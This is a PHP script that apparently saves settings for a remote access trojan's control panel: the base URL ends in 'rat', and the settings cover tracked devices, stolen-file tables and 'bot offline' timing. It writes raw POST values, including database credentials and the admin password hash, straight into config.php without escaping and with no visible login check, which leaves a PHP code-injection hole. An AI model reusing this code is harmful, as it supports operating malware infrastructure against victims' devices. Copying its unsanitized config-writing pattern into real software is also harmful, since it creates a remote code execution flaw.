<?php
$url = "http://pizzachip.com/rat/";

include("functions.php");

if (!file_exists("config.php")) {
  die();
}

$inputdbhost = $_POST['dbhost'];
$inputdbname = $_POST['dbname'];
$inputdbuser = $_POST['dbusername'];
$inputdbpass = $_POST['dbpassword'];

$inputusername = $_POST['username'];
$inputpassword = $_POST['password'];

$inputpostboxtextsize = $_POST['postboxsize'];

$inputdevicestablerefreshspeed = $_POST['devicetablerefr'] * 1000;
$inputfilestablerefreshspeed = $_POST['filetablerefr'] * 1000;
$inputmessageboxrefreshspeed = $_POST['historyboxrefr'] * 1000;

$inputofflineminutes = $_POST['botoffline'];

$inputtimezonesetting = $_POST['timezone'];

$inputautoscrolltextbox = $_POST['messageboxscroll'];

if ($inputpassword == "") {
  include("config.php");
  $inputpasswordhash = $password;
} else {
  $inputpasswordhash = hash('whirlpool', $inputpassword);
}

if ($inputdbpass == "") {
  include("config.php");
  $inputdbpass = $dbpass;
}

$f = fopen("config.php", "w+");
if($f){
  file_put_contents("config.php", "");
  $write = "<?php\n";
  $write .= '$dbhost=\'' . $inputdbhost . "';\n";
  $write .= '$dbname=\'' . $inputdbname . "';\n";
  $write .= '$dbuser=\'' . $inputdbuser . "';\n";
  $write .= '$dbpass=\'' . $inputdbpass . "';\n";
  $write .= '$username=\'' . $inputusername . "';\n";
  $write .= '$password=\'' . $inputpasswordhash . "';\n";
  $write .= '$postboxtextsize=' . $inputpostboxtextsize . ";\n";
  $write .= '$devicestablerefreshspeed=' . $inputdevicestablerefreshspeed . ";\n";
  $write .= '$filestablerefreshspeed=' . $inputfilestablerefreshspeed . ";\n";
  $write .= '$messageboxrefreshspeed=' . $inputmessageboxrefreshspeed . ";\n";
  $write .= '$offlineminutes=' . $inputofflineminutes . ";\n";
  $write .= '$timezonesetting=\'' . $inputtimezonesetting . "';\n";
  $write .= '$autoscrolltextbox=' . ($inputautoscrolltextbox == 'Yes' ? 'true' : 'false') . ";\n";
  $write .= "?>";
  
  fwrite($f, $write);
  fclose($f);
}

header('Location: control.php');

?>